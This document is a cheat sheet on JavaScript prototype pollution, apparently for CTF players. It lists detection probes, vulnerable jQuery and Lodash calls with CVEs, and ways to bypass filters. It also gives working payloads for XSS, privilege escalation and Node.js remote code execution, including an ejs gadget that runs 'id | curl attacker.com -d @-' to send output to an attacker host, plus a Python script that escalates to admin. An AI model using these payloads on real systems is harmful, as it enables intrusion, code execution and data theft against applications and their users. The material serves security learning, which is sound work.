# Prototype Pollution

## Concept

Every JavaScript object inherits from `Object.prototype`. If an attacker can set `__proto__.<key>`, all objects in the runtime inherit that property.

```javascript
// Basic proof
let obj = {}
obj.__proto__.isAdmin = true
let user = {}
console.log(user.isAdmin)  // true — inherited from Object.prototype
```

---

## Detection

### URL parameter probe
```
?__proto__[test]=polluted
?constructor[prototype][test]=polluted
?__proto__.test=polluted
```

### JSON body probe
```json
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
```

### Confirm via response/behavior
- Check if `{}.test` is now `"polluted"` in a subsequent request
- Watch for logic bypass: admin panel unlocks, role changes, debug mode

### Tool
```bash
# ppmap — automated PP source detection
ppmap -u "https://TARGET/?param=FUZZ"
```

---

## CTF Entry Points (where PP triggers)

| Trigger Function | Library | CVE |
|-----------------|---------|-----|
| `$.extend(true, {}, userInput)` | jQuery < 3.4.0 | CVE-2019-11358 |
| `_.merge({}, userInput)` | Lodash < 4.17.11 | CVE-2018-16487 |
| `_.mergeWith({}, userInput)` | Lodash < 4.17.11 | CVE-2018-3721 |
| `_.defaultsDeep({}, userInput)` | Lodash < 4.17.12 | CVE-2019-10744 |
| `_.setWith({}, "__proto__[x]", v)` | Lodash < 4.17.17 | SNYK-JS-LODASH-608086 |
| `_.zipObjectDeep(["__proto__.z"],[1])` | Lodash < 4.17.16 | CVE-2020-8203 |

### jQuery CVE-2019-11358
```javascript
// Vulnerable pattern
let a = $.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))
console.log({}.devMode)  // true
```

### Lodash CVE-2019-10744 (defaultsDeep)
```json
{"type":"test","content":{"prototype":{"constructor":{"a":"b"}}}}
```

### Lodash merge/mergeWith
```javascript
let malicious = '{"__proto__":{"oops":"pwned"}}'
_.merge({}, JSON.parse(malicious))
console.log({}.oops)  // "pwned"
```

---

## Client-Side PP → XSS (Gadget Chains)

After polluting `Object.prototype`, look for gadgets in the app's own JS:

```javascript
// Gadget pattern 1: innerHTML sink
// Pollute: __proto__.innerHTML = "<img src=x onerror=alert(1)>"
// Trigger: code does  element.innerHTML = options.template ?? ''

// Gadget pattern 2: eval sink
// Pollute: __proto__.onload = "alert(1)"
// Trigger: code does  eval(config.onload)

// Gadget pattern 3: script src
// Pollute: __proto__.src = "//attacker.com/xss.js"
```

### Finding gadgets
```bash
# Search app JS for prototype property reads without hasOwnProperty check
grep -r "\.innerHTML\|\.eval\|\.src\s*=" app.js
```

---

## Server-Side PP → RCE (Node.js)

When JSON from user reaches `merge()`/`deepMerge()` on server:

### Pattern 1: child_process via options pollution
```json
{"__proto__": {"shell": "node", "NODE_OPTIONS": "--inspect=attacker.com"}}
```

### Pattern 2: ejs template options
```json
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').exec('id | curl attacker.com -d @-');x"}}
```

### Pattern 3: Override toString/valueOf for RCE via template engines
```json
{"__proto__": {"escapeFunction": "JSON.stringify; process.mainModule.require('child_process').exec('id')"}}
```

### Pattern 4: Handlebars / Pug gadget
```json
{"__proto__": {"type": "Program", "body": [{"type": "MustacheStatement"}]}}
```

---

## Server-Side PP → Privilege Escalation

```json
{"__proto__": {"isAdmin": true}}
{"__proto__": {"role": "admin"}}
{"__proto__": {"authenticated": true}}
{"__proto__": {"authorized": true}}
```

Check if app reads `req.user.role` without `hasOwnProperty` → can become admin.

---

## Bypass Filters

### When `__proto__` is blocked
```
constructor.prototype
["__proto__"]
\u005f\u005fproto\u005f\u005f
```

### URL encoding
```
?__pro%74o[admin]=1
?__proto%5Badmin%5D=1
```

---

## Quick CTF Template

```python
import requests

TARGET = "http://TARGET:PORT"

# Step 1: Detect - pollute via JSON body
r = requests.post(f"{TARGET}/api/merge",
    json={"__proto__": {"polluted": "yes"}},
    headers={"Content-Type": "application/json"})

# Step 2: Check if subsequent request reflects polluted property
r2 = requests.get(f"{TARGET}/api/user")
if "polluted" in r2.text or r2.json().get("polluted"):
    print("[+] VULNERABLE to Prototype Pollution")

# Step 3: Escalate
requests.post(f"{TARGET}/api/merge",
    json={"__proto__": {"isAdmin": True, "role": "admin"}})
r3 = requests.get(f"{TARGET}/admin")
print(r3.status_code, r3.text[:200])
```

---

## Real CTF Examples

- **RedPwn CTF 2019 - Blueprint**: Lodash defaultsDeep PP → admin bypass
- **XNUCA 2019 Qualifier - HardJS**: PP chain to RCE
- **DiceCTF 2022 - the-other-jade**: PP → XSS gadget via innerHTML

---

## References

- PayloadsAllTheThings: Prototype Pollution
- [PP to RCE — research.securitum.com](https://research.securitum.com/prototype-pollution-rce/)
- [Client-side gadgets — portswigger.net](https://portswigger.net/web-security/prototype-pollution)
